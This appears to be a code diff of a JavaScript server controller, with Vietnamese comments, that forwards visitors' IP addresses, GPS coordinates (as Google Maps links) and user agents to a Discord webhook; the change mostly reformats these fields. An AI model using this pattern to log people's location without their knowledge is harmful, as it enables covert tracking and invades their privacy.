@@ -8,9 +8,7 @@ class OrtherController {
     try {
       const { lat, lon, referrer, userAgent } = req.body || {};
 
-      const ip =
-        req.headers["x-forwarded-for"]?.split(",")[0] ||
-        req.socket?.remoteAddress;
+      const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket?.remoteAddress;
       // Gửi về Discord
       await axios.post(config.DISCORD_WEBHOOK, {
         embeds: [
@@ -21,14 +19,11 @@ class OrtherController {
               { name: "🌐 IP", value: `\`${ip}\``, inline: true },
               {
                 name: "📍 Vị trí",
-                value: `https://www.google.com/maps/place/${lat || "unknown"},${
-                  lon || "unknown"
-                }`,
+                value: `${lat && lon ? `[Google Maps](https://www.google.com/maps/place/${lat},${lon})` : "Không xác định"}`,
                 inline: true,
               },
               { name: "💻 User-Agent", value: userAgent },
             ],
-            timestamp: new Date(),
           },
         ],
       });
